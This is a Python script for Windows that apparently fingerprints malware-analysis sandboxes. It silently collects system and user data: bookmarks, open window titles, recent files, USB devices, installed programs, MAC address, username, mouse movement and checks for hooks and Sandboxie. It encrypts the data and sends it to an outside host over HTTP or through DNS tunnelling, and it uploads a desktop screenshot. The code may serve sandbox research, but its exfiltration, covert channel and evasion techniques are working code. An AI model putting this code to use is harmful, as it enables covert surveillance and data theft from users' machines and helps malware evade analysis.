#!/usr/bin/env python
import subprocess
import re
import random, string
import os
import time
import socket
from uuid import getnode as get_mac
from ctypes import *
import hashlib
import traceback
import sys
import urllib2
from urllib import urlencode
import fnmatch
import errno, win32com.client, _winreg
import ctypes
from win32api import GetSystemMetrics
from threading import Thread
import pythoncom
from PIL import ImageGrab
import requests

#Global config
key = 'ANOTHERONEGOTCAUGHTTODAYITSALLOVERTHEPAPERSTEENAGERARRESTEDINCOMPUTERCRIMESCANDALHACKERARRESTEDAFTERBANKTAMPERINGDAMNKIDSTHEYREALLALIKEBUTDIDYOUINYOURTHREEPIECEPSYCHOLOGYANDSTECHNOBRAINEVERTAKEALOOKBEHINDTHEEYESOFTHEHACKERDIDYOUEVERWONDERWHATMADEHIMTICKWHATFORCESSHAPEDHIMWHATMAYHAVEMOLDEDHIMIAMAHACKERENTERMYWORLDMINEISAWORLDTHATBEGINSWITHSCHOOLIMSMARTERTHANMOSTOFTHEOTHERKIDSTHISCRAPTHEYTEACHUSBORESMEDAMNUNDERACHIEVERTHEYREALLALIKEIMINJUNIORHIGHORHIGHSCHOOLIVELISTENEDTOTEACHERSEXPLAINFORTHEFIFTEENTHTIMEHOWTOREDUCEAFRACTIONIUNDERSTANDITNOMSSMITHIDIDNTSHOWMYWORKIDIDITINMYHEADDAMNKIDPROBABLYCOPIEDITTHEYREALLALIKEIMADEADISCOVERYTODAYIFOUNDACOMPUTERWAITASECONDTHISISCOOLITDOESWHATIWANTITTOIFITMAKESAMISTAKEITSBECAUSEISCREWEDITUPNOTBECAUSEITDOESNTLIKEMEORFEELSTHREATENEDBYMEORTHINKSIMASMARTASSORDOESNTLIKETEACHINGANDSHOULDNTBEHEREDAMNKIDALLHEDOESISPLAYGAMESTHEYREALLALIKEANDTHENITHAPPENEDADOOROPENEDTOAWORLDRUSHINGTHROUGHTHEPHONELINELIKEHEROINTHROUGHANADDICTSVEINSANELECTRONICPULSEISSENTOUTAREFUGEFROMTHEDAYTODAYINCOMPETENCIESISSOUGHTABOARDISFOUNDTHISISITTHISISWHEREIBELONGIKNOWEVERYONEHEREEVENIFIVENEVERMETTHEMNEVERTALKEDTOTHEMMAYNEVERHEARFROMTHEMAGAINIKNOWYOUALLDAMNKIDTYINGUPTHEPHONELINEAGAINTHEYREALLALIKEYOUBETYOURASSWEREALLALIKEWEVEBEENSPOONFEDBABYFOODATSCHOOLWHENWEHUNGEREDFORSTEAKTHEBITSOFMEATTHATYOUDIDLETSLIPTHROUGHWEREPRECHEWEDANDTASTELESSWEVEBEENDOMINATEDBYSADISTSORIGNOREDBYTHEAPATHETICTHEFEWTHATHADSOMETHINGTOTEACHFOUNDUSWILLINGPUPILSBUTTHOSEFEWARELIKEDROPSOFWATERINTHEDESERTTHISISOURWORLDNOWTHEWORLDOFTHEELECTRONANDTHESWITCHTHEBEAUTYOFTHEBAUDWEMAKEUSEOFASERVICEALREADYEXISTINGWITHOUTPAYINGFORWHATCOULDBEDIRTCHEAPIFITWASNTRUNBYPROFITEERINGGLUTTONSANDYOUCALLUSCRIMINALSWEEXPLOREANDYOUCALLUSCRIMINALSWESEEKAFTERKNOWLEDGEANDYOUCALLUSCRIMINALSWEEXISTWITHOUTSKINCOLORWITHOUTNATIONALITYWITHOUTRELIGIOUSBIASANDYOUCALLUSCRIMINALSYOUBUILDATOMICBOMBSYOUWAGEWARSYOUMURDERCHEATANDLIETOUSANDTRYTOMAKEUSBELIEVEITSFOROUROWNGOODYETWERETHECRIMINALSYESIAMACRIMINALMYCRIMEISTHATOFCURIOSITYMYCRIMEISTHATOFJUDGINGPEOPLEBYWHATTHEYSAYANDTHINKNOTWHATTHEYLOOKLIKEMYCRIMEISTHATOFOUTSMARTINGYOUSOMETHINGTHATYOUWILLNEVERFORGIVEMEFORIAMAHACKERANDTHISISMYMANIFESTOYOUMAYSTOPTHISINDIVIDUALBUTYOUCANTSTOPUSALLAFTERALLWEREALLALIKE'
target = 'sndbxtst.info'  #target domain for leak <YOUR_DOMAIN>
url_end = '/sndbxtst/index.php'
url_screenshot_end = "/sndbxtst/scrn.php"
subdomain = '.tt.'

#Local config
target_ip = "159.8.37.74"   #what is the IP for $target <YOUR_IP>
test_url = 'https://github.com/favicon.ico'
test_hash = '4eda7c0f3a36181f483dd0a14efe9f58c8b29814'

# get non-default bookmarks from IE
def get_bookmarks():
    known = ["Suggested Sites.url", "Web Slice Gallery.url", "GobiernoUSA.gov.url",
             "USA.gov.url", "IE Add-on site.url", "IE site on Microsoft.com.url", "Microsoft At Home.url",
             "Microsoft At Work.url", "Microsoft Store.url", "MSN Autos.url", "MSN Entertainment.url", "MSN Money.url",
             "MSN Sports.url", "MSN.url", "MSNBC News.url", "Get Windows Live.url", "Windows Live Gallery.url",
             "Windows Live Mail.url", "Windows Live Spaces.url",
             "Customize Links.url", "Free Hotmail.url", "Marketplace.url", "MSN com.url", "Radio Station Guide.url",
             "Welcome to IE7.url", "Windows Marketplace.url", "Windows Media.url", "Windows.url",
             ]
    matches = ""
    for root, dirnames, filenames in os.walk(os.getenv('homedrive') + os.getenv('homepath') + os.sep + 'Favorites'):
      for filename in fnmatch.filter(filenames, '*.url'):
          if filename not in known:
              matches = matches + "BKMRK " + filename + "|"
    return matches
# get the number of files which have been recently opened (saved in registry)
def get_recently_opened_files():
    pythoncom.CoInitialize()
    shell = win32com.client.Dispatch('WScript.Shell')
    proc_arch = shell.ExpandEnvironmentStrings(r'%PROCESSOR_ARCHITECTURE%').lower()
    if proc_arch == 'x86':
        arch_keys = {0}
    elif proc_arch == 'amd64':
        arch_keys = {_winreg.KEY_WOW64_32KEY, _winreg.KEY_WOW64_64KEY}
    recentstuff = ""
    for arch_key in arch_keys:
        try:
            key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU", 0, _winreg.KEY_READ | arch_key)
        except WindowsError:
            return "error"
        try:
            recentstuff = 0
            while 1:
                name, value, type = _winreg.EnumValue(key, recentstuff)
                # print repr(name),
                recentstuff = recentstuff + 1
        except WindowsError:
            pass
        key.Close()
    return 'RRG ' + str(recentstuff) + '|'
# get number of pendrives used in computer
def get_pendrives():
    pythoncom.CoInitialize()
    shell = win32com.client.Dispatch('WScript.Shell')
    proc_arch = shell.ExpandEnvironmentStrings(r'%PROCESSOR_ARCHITECTURE%').lower()
    if proc_arch == 'x86':
        arch_keys = {0}
    elif proc_arch == 'amd64':
        arch_keys = {_winreg.KEY_WOW64_32KEY, _winreg.KEY_WOW64_64KEY}
    pendrives = ""
    for arch_key in arch_keys:
        try:
            key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\USBSTOR", 0, _winreg.KEY_READ | arch_key)
        except WindowsError:
            return "PNDRV no_pendrive|"
        for i in xrange(0, _winreg.QueryInfoKey(key)[0] - 1):
            skey_name = _winreg.EnumKey(key, i)
            skey = _winreg.OpenKey(key, skey_name)
            try:
                skey_name2 = _winreg.EnumKey(skey, 0)
                skey2 = _winreg.OpenKey(skey, skey_name2)
                pendrives = pendrives + 'PNDRV ' + str(_winreg.QueryValueEx(skey2, 'FriendlyName')[0]) + '|'
            except OSError as e:
                if e.errno == errno.ENOENT:
                    # traceback.print_exc()
                    # DisplayName doesn't exist in this skey
                    pass
            finally:
                skey.Close()
        return pendrives
titles = ""
# get applications with Windows GUI
def enumwindows():
    EnumWindows = ctypes.windll.user32.EnumWindows
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
    GetWindowText = ctypes.windll.user32.GetWindowTextW
    GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
    IsWindowVisible = ctypes.windll.user32.IsWindowVisible
    def foreach_window(hwnd, lParam):
        global titles
        if IsWindowVisible(hwnd):
            length = GetWindowTextLength(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, buff, length + 1)
            # print(buff.value)
            regex = re.compile(r"\W+")
            titles2 = regex.sub("-", buff.value)
            titles = titles + "WINT " + titles2.encode("ascii", "replace") + "|"
        return True
    EnumWindows(EnumWindowsProc(foreach_window), 0)
    return titles + "|"
# check the VIDEOBIOSVERSION, known VM detection technique
def get_videobios():
    pythoncom.CoInitialize()
    shell = win32com.client.Dispatch('WScript.Shell')
    proc_arch = shell.ExpandEnvironmentStrings(r'%PROCESSOR_ARCHITECTURE%').lower()
    if proc_arch == 'x86':
        arch_keys = {0}
    elif proc_arch == 'amd64':
        arch_keys = {_winreg.KEY_WOW64_32KEY, _winreg.KEY_WOW64_64KEY}
    videobios = ""
    for arch_key in arch_keys:
        try:
            key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\SYSTEM", 0, _winreg.KEY_READ | arch_key)
        except WindowsError:
            return "error"
        try:
            videobios = videobios + 'VBIO ' + str(_winreg.QueryValueEx(key, 'VIDEOBIOSVERSION')[0][0]).encode("ascii", "replace") + '|'
        except OSError as e:          
            if e.errno == errno.ENOENT:
                pass
        finally:
            key.Close()
    return videobios
def hex2(n):
    return hex (n & 0xffffffff)[:-1]
# check whether function is hooked
def is_hooked(func):
    addr = addressof(func)
    # http://knowyourmeme.com/photos/234765-i-have-no-idea-what-im-doing
    g = (c_int * 1).from_address(addr)
    g = (c_int * 1).from_address(g[0])
    if hex2(g[0]) == "0x8b55ff8b":
        # print("not_hooked")
        return False
    else:
        # print("hooked")
        return True
# create random word with length
def randomword(length):
   return ''.join(random.choice(string.lowercase) for i in range(length))# check whether Internet access is available
def test_network(url, hash):
    try:
        response = urllib2.urlopen(url, timeout=4)
        html = response.read()
        hash_object = hashlib.sha1(html)
        hex_dig = hash_object.hexdigest()
        # print(hex_dig)
        if(hash == hex_dig):
            return True
        else:
            return False
    except:
        return False
# check whether DNS is available
def test_dns(domain, ip):
    try:
        resolved_ip = socket.gethostbyname(domain)
        # print(hex_dig)
        if(resolved_ip == ip):
            return True
        else:
            return False
    except:
        return False    
# run the command in cmd shell    
def run_command(cmd):
    out = ""
    try:
        # instantiate a startupinfo obj:
        startupinfo = subprocess.STARTUPINFO()
        # set the use show window flag, might make conditional on being in Windows:
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        # pass as the startupinfo keyword argument:
        out, err = subprocess.Popen(cmd,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE,
                         stdin=subprocess.PIPE,
                         startupinfo=startupinfo).communicate()
    except:
        pass
    return out
# number of recently modified files 
def num_of_recent_files(path, days):
    i = 0
    for folder, subs, files in os.walk(path):
        for filename in files:
            file_path = os.path.join(folder, filename)
            try:
                if ((os.path.getctime(file_path) + (60 * 60 * 24 * days)) > int(time.time())):
                    i = i + 1
            except:
                pass
    return i
# is the local port open?
def port_open(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1', int(port)))
    if result == 0:
        # print "Port {}: \t Open".format(port)
        return True
    else :
        return False
class POINT(Structure):
    _fields_ = [("x", c_ulong), ("y", c_ulong)]
# get the current position of the mouse
def queryMousePosition():
    pt = POINT()
    windll.user32.GetCursorPos(byref(pt))
    return str(pt.x) + "_" + str(pt.y)

def check_dll(dll):
    windll.kernel32.GetModuleHandleW.restype = wintypes.HMODULE
    windll.kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
    hMod = windll.kernel32.GetModuleHandleW(dll)
    result = 'DLL ' + hMod + "|"
    return result
# encrypt our staff with Vigenere, code stolen from here: https://inventwithpython.com/vigenereCipher.py
# this has the security as an MTP encryption (Many Time Pad) - see here http://travisdazell.blogspot.in/2012/11/many-time-pad-attack-crib-drag.html
# yes, this crypto is broken
def translateMessage(message, key, mode):
    LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    translated = []  # stores the encrypted/decrypted message string
    keyIndex = 0
    key = key.upper()
    for symbol in message:  # loop through each character in message
        num = LETTERS.find(symbol.upper())
        if num != -1:  # -1 means symbol.upper() was not found in LETTERS
            if mode == 'encrypt':
                num += LETTERS.find(key[keyIndex])  # add if encrypting
            elif mode == 'decrypt':
                num -= LETTERS.find(key[keyIndex])  # subtract if decrypting
            num %= len(LETTERS)  # handle the potential wrap-around
            # add the encrypted/decrypted symbol to the end of translated.
            if symbol.isupper():
                translated.append(LETTERS[num])
            elif symbol.islower():
                translated.append(LETTERS[num].lower())
            keyIndex += 1  # move to the next letter in the key
            if keyIndex == len(key):
                keyIndex = 0
        else:
            # The symbol was not in LETTERS, so add it to translated as is.
            translated.append(symbol)
    return ''.join(translated)
def format_helper(commands):
    result = ""
    for c, v in commands.iteritems():
        out = v + " " + run_command(c)
        temp = out.replace('\r', '').replace('\n', '').replace('\t', '')
        regex = re.compile(r"\s+")
        result2 = result + regex.sub(" ", temp) + "|"
        regex2 = re.compile(r"\s\|")
        result = regex2.sub("|", result2)
    return result
# group of commands to run in thread
def commands_0(result, target, key, host, network_avail, dns_avail):
    # python wmi was too sloooooow :/
    commands = {'wmic os get serialnumber': 'SN',
                'wmic logicaldisk get name':'LDN',
                'wmic logicaldisk get freespace':'FSP',
                'wmic logicaldisk get size':'LS',
                'wmic logicaldisk get providername':'PVN',
                'wmic diskdrive get caption':'DDC',
                'wmic diskdrive get model':'DDM',
                'wmic computersystem get totalphysicalmemory':'PM',
                'wmic computersystem get systemtype':'CST',
                'wmic os get lastbootuptime':'BTT',  # does not work on XP
                }
    result = format_helper(commands)
    send_data(result, target, key, host, network_avail, dns_avail)
def commands_1(result, target, key, host, network_avail, dns_avail):
    commands = {
                'wmic cpu get name':'CPN',
                'wmic cpu get numberofcores':'CPC',
                'wmic cpu get numberoflogicalprocessors':'CPL',
                
                }
    result = format_helper(commands)
    send_data(result, target, key, host, network_avail, dns_avail)
def commands_2(result, target, key, host, network_avail, dns_avail):
    commands = {
                'wmic printer get name':'PRN',
                'wmic baseboard get manufacturer':'BM',
                'wmic computersystem get model':'CSM',
                'wmic bios get version':'BV',  # sometimes buggy, and only received results like Please-wait-while-WMIC ...
                'wmic os get installdate':'ID',
                'wmic os get caption':'OS',
                'wmic cdrom get caption':'CDR',
                'wmic computersystem get OEMStringArray':'OEM',
                'wmic desktopmonitor get caption':'MON',
                'wmic systemenclosure get manufacturer':'SYE',
                'wmic sounddev get caption':'SND',
                }
    result = format_helper(commands)
    send_data(result, target, key, host, network_avail, dns_avail)
def commands_3(result, target, key, host, network_avail, dns_avail):
    commands = {
                'netsh winhttp show proxy':'PR1',
                'netsh diag connect ieproxy':'PR2',
                'netsh advfirewall show allprofiles state':'FW1',
                'netsh firewall show state':'FW2',
                }
    result = format_helper(commands)
    send_data(result, target, key, host, network_avail, dns_avail)
def commands_4(result, target, key, host, network_avail, dns_avail):
    commands = {'wmic product get Name':'PN',
                'wmic process get executablepath':'EX'}
    for c, v in commands.iteritems():
        # print (c)
        out = run_command(c)
        # todo fix this
        temp = out.replace('\r', '').replace('\n', '|' + v + " ").replace('\t', '')
        regex = re.compile(r"\s+")
        result2 = result + regex.sub(" ", temp) + "|"
        regex2 = re.compile(r"\s\|")
        result = regex2.sub("|", result2)
    send_data(result, target, key, host, network_avail, dns_avail)
def commands_5(result, target, key, host, network_avail, dns_avail):
    result = result + 'RINTEMP ' + str(num_of_recent_files(os.path.expandvars('%TEMP%'), 7)) + "|"
    result = result + 'RINDESK ' + str(num_of_recent_files(os.path.expandvars('%USERPROFILE%') + '\\Desktop', 7)) + "|"
    result = result + 'RINDOC ' + str(num_of_recent_files(os.path.expandvars('%USERPROFILE%') + '\\Documents', 7)) + "|"
    result = result + 'RINLOCAPPD ' + str(num_of_recent_files(os.path.expandvars('%LOCALAPPDATA%'), 7)) + "|"
    result = result + 'RINAPPD ' + str(num_of_recent_files(os.path.expandvars('%APPDATA%'), 7)) + "|"
    result = result + 'AINDESK ' + str(num_of_recent_files(os.path.expandvars('%USERPROFILE%') + '\\Desktop', 99999)) + "|"
    send_data(result, target, key, host, network_avail, dns_avail)
def commands_6(result, target, key, host, network_avail, dns_avail):
    
    result = result + "WIDTH " + str(GetSystemMetrics (0)) + "|"
    result = result + "HEIGHT " + str(GetSystemMetrics (1)) + "|"
    result = result + "USER " + os.path.expandvars('%USERNAME%') + "|"
    result = result + "USERDOM " + os.path.expandvars('%USERDOMAIN%') + "|"
    # result =  result + 'aindoc-' + str(num_of_recent_files(os.path.expandvars('%USERPROFILE%')+ '\\Documents',99999))+ "|"
   
    mac = get_mac()
    result = result + 'MAC ' + '-'.join(("%012X" % mac)[i:i + 2] for i in range(0, 12, 2)) + "|"
    result = result + 'HOOKD ' + str(is_hooked(windll.kernel32.DeleteFileW)) + "|"
    result = result + 'HOOKR ' + str(is_hooked(windll.advapi32.RegOpenKeyExA)) + "|"
    result = result + 'EXECP ' + str(os.path.dirname(os.path.realpath(sys.argv[0]))) + "|"
    result = result + 'EXEC ' + str(sys.argv[0].split(os.sep)[-1]) + "|"
    result = result + 'TIME ' + str(time.time()) + "|"
    send_data(result, target, key, host, network_avail, dns_avail)
def commands_7(result, target, key, host, network_avail, dns_avail):
    # pokemon style error handling
    try:
        result = result + get_recently_opened_files() 
    except:
        pass
    try:
        result = result + get_bookmarks() + "|"
    except:
        pass
    try:
        result = result + enumwindows()
    except:
        pass
    try:
        result = result + get_videobios()
    except:
        pass
    try:
        result = result + 'SBIE ' + check_dll('sbiedll.dll')
    except:
        pass
    send_data(result, target, key, host, network_avail, dns_avail)
def commands_8(result, target, key, host, network_avail, dns_avail):
     result = result + 'LOCALPORT ' + str(port_open(445)) + "|"
     send_data(result, target, key, host, network_avail, dns_avail)
def commands_9(result, target, key, host, network_avail, dns_avail):
    try:
        result = result + get_pendrives()
    except:
        pass
    send_data(result, target, key, host, network_avail, dns_avail)
def mysleep():
    time.sleep(5)
# check whether someone or something clicked on the messagebox
def msgbox(target, key, host, network_avail, dns_avail):
    ctypes.windll.user32.MessageBoxA(0, "", "", 0)
    # we only arrive here if ok has been clicked
    result = 'OK ' + "ICANHAZCLICK" + "|"
    send_data(result, target, key, host, network_avail, dns_avail)
# create a lot of computation in this thread while the other thread sleeps. Meanwhile measure mouse position
def calc_hash():
    pos1 = queryMousePosition()
    global t1
    global result
    hash_object = hashlib.sha1("x")
    # print(str(datetime.datetime.utcnow()))
    for i in range(100000):
        hash_object = hashlib.sha1(hash_object.hexdigest())
    # print(str(datetime.datetime.utcnow()))
    pos2 = queryMousePosition()
    result = ""
    result = result + 'MOUSE1 ' + pos1 + "|"
    result = result + 'MOUSE2 ' + pos2 + "|"
    z = t1.isAlive()
    result = result + 'SLEEPWORKS ' + str(z) + "|"
    return result
# for dns tunneling split the domain names
def rec_split(str, key, host, target):
    enc1 = translateMessage(str[:61], key, 'encrypt')
    socket.gethostbyname(enc1 + '.' + host + subdomain + target)
    if len(str) > 61:
        rec_split('X-' + str[61:], key, host, target)
# send extracted data via http or dns
def send_data(result, target, key, host, network_avail, dns_avail):
    #
    if network_avail:  
        encrypted = translateMessage(result, key, 'encrypt')
        data = urlencode({'d':encrypted, 's':host})
        try:
            u = urllib2.urlopen('http://' + target + url_end, data)
            u.request('POST', url_end, data)
        except:
            pass
    elif dns_avail:
        # dns data
        iter = result.split('|')
        for i in iter:
            try:
                regex = re.compile(r"\W+")
                name = regex.sub("-", i)
                if len(name) > 3:
                    rec_split(name, key, host, target)
            except:
                pass
            
    else:
        iter = result.split('|')
        for i in iter:
            try:
                regex = re.compile(r"\W+")
                name = regex.sub("-", i)
                open(translateMessage(name, key, 'encrypt'), 'a').close()
            except:
                pass
                
try:

    host = randomword(10)
    network_avail = test_network(test_url, test_hash)
    dns_avail = test_dns(target, target_ip)
    #network_avail = True
    #dns_avail = True
    fl = [commands_1,commands_2,
          #commands_3,commands_4,    #disabled
          commands_5,commands_6,commands_7,commands_8,commands_9]
    t = []
    for f in fl:
        try:
            result = ""
            t1 = Thread(target=f, args=(result, target, key, host, network_avail, dns_avail))
            t1.start()
            t.append(t1)
        except:
            pass   
   
    try:
        #is sleep emulated?
        t1 = Thread(target=mysleep, args=())
        t1.start()
        t2 = Thread(target=calc_hash, args=())
        t2.start()
        t1.join()
        t2.join()
        send_data(result, target, key, host, network_avail, dns_avail)
        t3 = Thread(target=msgbox, args=(target, key, host, network_avail, dns_avail))
        t3.start()
    except:
        pass
    # send a desktop screenshot if direct http connection is available
    try:
        if network_avail:
            ImageGrab.grab().save(host + ".png", "PNG")
            url = 'http://' + target + url_screenshot_end + "?h=" + host
            files = {host + '.png': open(host + '.png', 'rb')}
            r = requests.post(url, files=files)
    except:
        pass

    # wait all thread to finish
    for x in t:
        x.join()
    
except:
    # print("e")
    #traceback.print_exc()
    pass
